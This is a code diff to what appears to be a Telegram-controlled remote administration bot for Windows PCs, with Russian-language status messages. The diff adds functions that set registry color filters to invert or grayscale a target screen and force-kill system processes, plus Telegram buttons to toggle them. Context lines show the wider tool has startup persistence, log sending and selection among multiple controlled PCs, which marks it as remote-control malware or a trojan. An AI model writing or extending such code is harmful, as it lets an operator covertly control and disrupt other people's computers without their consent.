@@ -1458,21 +1458,73 @@ def flip_screen():
 
 def invert_colors():
     try:
-        import ctypes
-        user32 = ctypes.windll.user32
-        user32.ChangeDisplaySettingsExW(None, None, None, 0, None)
+        import winreg
+        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ColorFilters"
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(key, "Active", 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(key, "FilterType", 0, winreg.REG_DWORD, 2)  # 2 = Invert
+        winreg.CloseKey(key)
+        
+        os.system("taskkill /f /im TextInputHost.exe 2>nul")
+        os.system("start ms-settings:easeofaccess-colorfilters")
+        time.sleep(1)
+        os.system("taskkill /f /im SystemSettings.exe 2>nul")
+        
         return "✅ Цвета инвертированы!"
-    except:
-        return "❌ Ошибка"
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
 
 def grayscale_mode():
     try:
-        import ctypes
-        user32 = ctypes.windll.user32
-        user32.ChangeDisplaySettingsExW(None, None, None, 0, None)
-        return "✅ Чёрно-белый режим!"
-    except:
-        return "❌ Ошибка"
+        import winreg
+        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ColorFilters"
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(key, "Active", 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(key, "FilterType", 0, winreg.REG_DWORD, 1)  # 1 = Grayscale
+        winreg.CloseKey(key)
+        
+        os.system("taskkill /f /im TextInputHost.exe 2>nul")
+        os.system("start ms-settings:easeofaccess-colorfilters")
+        time.sleep(1)
+        os.system("taskkill /f /im SystemSettings.exe 2>nul")
+        
+        return "✅ Чёрно-белый режим включён!"
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
+
+def disable_grayscale():
+    try:
+        import winreg
+        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ColorFilters"
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(key, "Active", 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(key)
+        
+        os.system("taskkill /f /im TextInputHost.exe 2>nul")
+        os.system("start ms-settings:easeofaccess-colorfilters")
+        time.sleep(1)
+        os.system("taskkill /f /im SystemSettings.exe 2>nul")
+        
+        return "✅ Чёрно-белый режим выключен!"
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
+
+def disable_invert():
+    try:
+        import winreg
+        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ColorFilters"
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(key, "Active", 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(key)
+        
+        os.system("taskkill /f /im TextInputHost.exe 2>nul")
+        os.system("start ms-settings:easeofaccess-colorfilters")
+        time.sleep(1)
+        os.system("taskkill /f /im SystemSettings.exe 2>nul")
+        
+        return "✅ Инверсия цветов выключена!"
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
 
 def night_mode():
     try:
@@ -2210,7 +2262,9 @@ def start(update, context):
         [InlineKeyboardButton("🔑 Enable Startup", callback_data="enable_startup")],
         [InlineKeyboardButton("🌀 Flip Screen", callback_data="flip_screen")],
         [InlineKeyboardButton("🌀 Invert Colors", callback_data="invert_colors")],
+        [InlineKeyboardButton("🌀 Invert OFF", callback_data="disable_invert")],
         [InlineKeyboardButton("🌀 Grayscale", callback_data="grayscale")],
+        [InlineKeyboardButton("🌀 Grayscale OFF", callback_data="disable_grayscale")],
         [InlineKeyboardButton("🌀 Night Mode", callback_data="night_mode")],
         [InlineKeyboardButton("🌀 Magnify", callback_data="magnify")],
         [InlineKeyboardButton("🌀 Blur", callback_data="blur")],
@@ -2710,6 +2764,10 @@ def callback(update, context):
         bot.send_message(chat_id, get_weather())
     elif data == "send_log":
         bot.send_message(chat_id, send_log())
+    elif data == "disable_grayscale":
+        bot.send_message(chat_id, disable_grayscale())
+    elif data == "disable_invert":
+        bot.send_message(chat_id, disable_invert())
 
 def handle_message(update, context):
     global selected_pc
